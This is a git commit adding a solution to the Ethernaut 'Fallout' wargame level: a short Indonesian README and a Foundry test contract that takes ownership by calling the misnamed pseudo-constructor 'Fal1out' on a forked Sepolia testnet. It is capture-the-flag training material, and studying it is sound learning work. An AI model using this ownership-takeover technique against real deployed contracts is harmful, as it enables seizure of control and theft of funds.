21c1357a038b47f886a4ce8931d43b37dca7df74
Gizka <endolendah4@gmail.com>
2023-05-09 14:44:49 +0700

    Fallout attack

---
+++ src/Ethernaut/03-Fallout/README.md
@@ -0,0 +1,5 @@
+## Goal
+Mengklaim kepemilikan.
+
+## Clue
+Constructor versi lama.
---
+++ src/Ethernaut/PoC/03-Fallout.sol
@@ -0,0 +1,27 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8;
+
+import '../Ethernaut.sol';
+import '../03-Fallout/FalloutFactory.sol';
+import 'forge-std/Test.sol';
+
+contract FalloutAttack is Test {
+    function test() external {
+        vm.createSelectFork(vm.envString('sepolia'));
+        console.log('setup');
+        Ethernaut ethernaut = new Ethernaut();
+        FalloutFactory falloutfactory = new FalloutFactory();
+        ethernaut.registerLevel(falloutfactory);
+        address alice = makeAddr('alice');
+        vm.startPrank(alice, alice);
+        address falloutAddr = ethernaut.createLevelInstance(falloutfactory);
+        Fallout fallout = Fallout(falloutAddr);
+        emit log_named_address('address fallout', address(fallout));
+        console.log('PoC:');
+        console.log('1. constructor typo');
+        fallout.Fal1out();
+        console.log('submit');
+        bool sukses = ethernaut.submitLevelInstance(payable(address(fallout)));
+        assertTrue(sukses);
+    }
+}
